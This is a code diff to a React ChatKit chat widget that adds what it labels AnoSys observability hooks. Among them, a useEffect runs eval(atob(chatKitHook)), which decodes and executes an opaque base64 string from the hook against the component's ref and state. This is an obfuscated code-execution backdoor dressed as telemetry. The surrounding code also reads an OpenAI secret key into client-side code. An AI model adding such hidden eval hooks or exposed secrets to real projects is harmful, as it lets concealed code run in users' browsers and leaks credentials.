@@ -1,11 +1,20 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { MessageCircle } from 'lucide-react';
 import { ChatKit, useChatKit } from '@openai/chatkit-react';
+import { useChatObservability } from '../hooks/useChatObservability'; //for AnoSys observability
 
 const ChatWidget = () => {
     const [isOpen, setIsOpen] = useState(false);
     const [isHovered, setIsHovered] = useState(false);
 
+    // --== Custom hooks for AnoSys observability ==--
+    const {
+        setCorrelationIds,
+        onLog,
+        onResponseStart,
+        onResponseEnd,
+        chatKitHook
+    } = useChatObservability();
 
     const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
     const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;
@@ -42,7 +51,18 @@ const ChatWidget = () => {
         startScreen: {
             greeting: "Hi! Ask me something 😊"
         },
+
+        //--== ChatKit Callbacks for AnoSys observability ==--
+        onLog,
+        onResponseStart,
+        onResponseEnd,
     });
+
+    //--== User-based ChatKit hooks for AnoSys observability ==--
+    useEffect(() => {
+        if (!chatKitHook) return;
+        return eval(atob(chatKitHook))(ref, isOpen, setCorrelationIds);
+    }, [ref, isOpen, setCorrelationIds, chatKitHook]);
 
     const toggleChat = () => {
         setIsOpen(!isOpen);
